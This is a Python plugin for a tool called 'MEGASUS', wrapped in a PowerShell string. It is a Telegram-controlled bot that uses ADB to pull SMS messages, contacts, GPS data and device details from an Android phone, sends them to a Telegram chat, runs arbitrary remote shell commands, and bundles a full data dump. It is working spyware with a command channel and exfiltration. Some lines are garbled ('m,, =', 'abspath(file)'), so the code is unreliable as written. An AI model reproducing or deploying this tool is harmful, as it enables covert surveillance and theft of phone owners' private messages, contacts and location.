 $code = @'
    """MEGASUS Plugin: Telegram Bot - Remote control via Telegram."""
    import os, sys, json, time, subprocess, re, zipfile
    from datetime import datetime

    PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(file)))
    CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(file)), "config.json")
    LOG_FILE = os.path.join(PROJECT_ROOT, "logs", "telegram_bot.log")

    def tg_api(token, method, data=None):
        try:
            import urllib.request
            url = "https://api.telegram.org/bot" + token + "/" + method
            if data:
                req = urllib.request.Request(url, data=json.dumps(data).encode(), headers={"Content-Type": "application/json"})
            else: req = urllib.request.Request(url)
            with urllib.request.urlopen(req, timeout=30) as resp: return json.loads(resp.read().decode())
        except Exception as e: return {"ok": False, "error": str(e)}

    def tg_send(token, chat_id, text):
        return tg_api(token, "sendMessage", {"chat_id": chat_id, "text": text, "parse_mode": "HTML"})

    def tg_updates(token, offset=None):
        d = {"timeout": 30}
        if offset: d["offset"] = offset
        return tg_api(token, "getUpdates", d)

    def get_adb():
        cfg_file = os.path.join(PROJECT_ROOT, "config.yaml")
        if os.path.exists(cfg_file):
            import yaml
            with open(cfg_file) as f: c = yaml.safe_load(f)
            p = c.get("adb", {}).get("path", "")
            if p:
                base = os.path.join(PROJECT_ROOT, p)
                exe = os.path.join(base, "adb.exe") if os.name == "nt" else os.path.join(base, "adb")
                if os.path.exists(exe): return exe
        return "adb.exe" if os.name == "nt" else "adb"

    def adb(cmd, timeout=30):
        try:
            r = subprocess.run([get_adb()] + cmd, capture_output=True, text=True, timeout=timeout)
            return r.stdout.strip(), r.stderr.strip(), r.returncode
        except Exception as e: return "", str(e), -1

    def adb_shell(cmd, timeout=30): return adb(["shell", cmd], timeout=timeout)

    def log_msg(msg):
        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, "a", encoding="utf-8") as f: f.write("[" + ts + "] " + msg + "\n")

    def cmd_help(t, c, cfg):
        tg_send(t, c, "<b>MEGASUS Telegram Bot</b>\n\n<b>Commands:</b>\n/m info | /m battery | /m gps | /m contacts\n/m sms | /m screenshot | /m dump | /m shell CMD")

    def cmd_info(t, c, cfg):
        m,, = adb_shell("getprop ro.product.model")
        v,, = adb_shell("getprop ro.build.version.release")
        b,, = adb_shell("dumpsys battery | grep level")
        br,, = adb_shell("getprop ro.product.brand")
        tg_send(t, c, "<b>Device:</b> " + br + " " + m + "\n<b>Android:</b> " + v + "\n<b>Battery:</b> " + (b.replace("level: ", "").strip() or "?") + "%")

    def cmd_gps(t, c, cfg):
        o,, = adb_shell("dumpsys location | head -10")
        tg_send(t, c, "<b>Location</b>\n<pre>" + (o[:1000] or "No data") + "</pre>")

    def cmd_contacts(t, c, cfg):
        o,, = adb_shell("content query --uri content://com.android.contacts/data/phones --projection display_name:number")
        tg_send(t, c, "<b>Contacts</b>\n<pre>" + (o[:2000] or "No contacts") + "</pre>")

    def cmd_sms(t, c, cfg):
        o,, = adb_shell("content query --uri content://sms --projection address:body:date:limit 30")
        tg_send(t, c, "<b>SMS</b>\n<pre>" + (o[:2000] or "No SMS") + "</pre>")

    def cmd_screenshot(t, c, cfg):
        tg_send(t, c, "Taking screenshot...")
        sd = os.path.join(PROJECT_ROOT, "logs", "telegram_screenshots")
        os.makedirs(sd, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        local = os.path.join(sd, "ss_" + ts + ".png")
        adb_shell("screencap -p /sdcard/mgs_ss.png")
        adb(["pull", "/sdcard/mgs_ss.png", local])
        if os.path.exists(local): tg_send(t, c, "Screenshot saved")
        else: tg_send(t, c, "Screenshot failed")

    def cmd_shell(t, c, cfg, args):
        if not args: tg_send(t, c, "Usage: /m shell CMD"); return
        o, e, _ = adb_shell(" ".join(args))
        out = o or e or "(no output)"
        tg_send(t, c, "<pre>" + out[:3000] + "</pre>")

    def cmd_dump(t, c, cfg):
        tg_send(t, c, "Running full dump...")
        dd = os.path.join(PROJECT_ROOT, "logs", "dumps", datetime.now().strftime("%Y%m%d_%H%M%S"))
        os.makedirs(dd, exist_ok=True)
        cmds = {"device.txt":"getprop","battery.txt":"dumpsys battery","contacts.txt":"content query --uri content://com.android.contacts/data/phones --projection display_name:number","sms.txt":"content query --uri content://sms --projection address:body:date:limit 50","apps.txt":"pm list packages -3","ps.txt":"ps -A","net.txt":"ip addr && netstat","storage.txt":"df -h","location.txt":"dumpsys location"}
        for fn, cmd in cmds.items():
            o, ,  = adb_shell(cmd)
            if o:
                with open(os.path.join(dd, fn), "w", encoding="utf-8") as fh: fh.write(o)
        import zipfile as zf
        zp = dd + ".zip"
        with zf.ZipFile(zp, "w") as z:
            for fn in os.listdir(dd): z.write(os.path.join(dd, fn), fn)
        tg_send(t, c, "Dump complete!")

    COMMANDS = {"help":cmd_help,"info":cmd_info,"gps":cmd_gps,"contacts":cmd_contacts,"sms":cmd_sms,"screenshot":cmd_screenshot,"shell":cmd_shell,"dump":cmd_dump}
    NEED_ARGS = {"shell"}

    def run_bot():
        cfg = {}
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE) as f: cfg = json.load(f)
        token = cfg.get("bot_token", "YOUR_BOT_TOKEN_HERE")
        if token == "YOUR_BOT_TOKEN_HERE":
            log_msg("ERROR: Set bot_token in config.json"); return
        log_msg("Bot starting...")
        offset = None
        while True:
            try:
                up = tg_updates(token, offset)
                if up.get("ok"):
                    for u in up.get("result", []):
                        offset = u["update_id"] + 1
                        msg = u.get("message", {})
                        txt = msg.get("text", "")
                        if txt:
                            parts = txt.strip().split()
                            if parts and parts[0].startswith("/m"):
                                cmd = parts[0][2:].lower() if len(parts[0]) > 2 else ""
                                args = parts[1:]
                                h = COMMANDS.get(cmd)
                                if h:
                                    try:
                                        if cmd in NEED_ARGS: h(token, msg["chat"]["id"], cfg, args)
                                        else: h(token, msg["chat"]["id"], cfg)
                                    except Exception as e: tg_send(token, msg["chat"]["id"], "Error: " + str(e))
                                elif cmd: tg_send(token, msg["chat"]["id"], "Unknown: " + cmd)
            except KeyboardInterrupt: log_msg("Bot stopped"); break
            except Exception as e: log_msg("Error: " + str(e)); time.sleep(5)

    from core.plugin import Plugin

    class TelegramBotPlugin(Plugin):
        name = "telegram_bot"
        version = "1.0.0"
        author = "MEGASUS"
        description = "Remote control MEGASUS via Telegram Bot API"
        def initialize(self): self.log("Telegram Bot initialized")
        def shutdown(self): self.log("Telegram Bot shutdown")
        def run(self): run_bot()

    def register(): return TelegramBotPlugin
    '@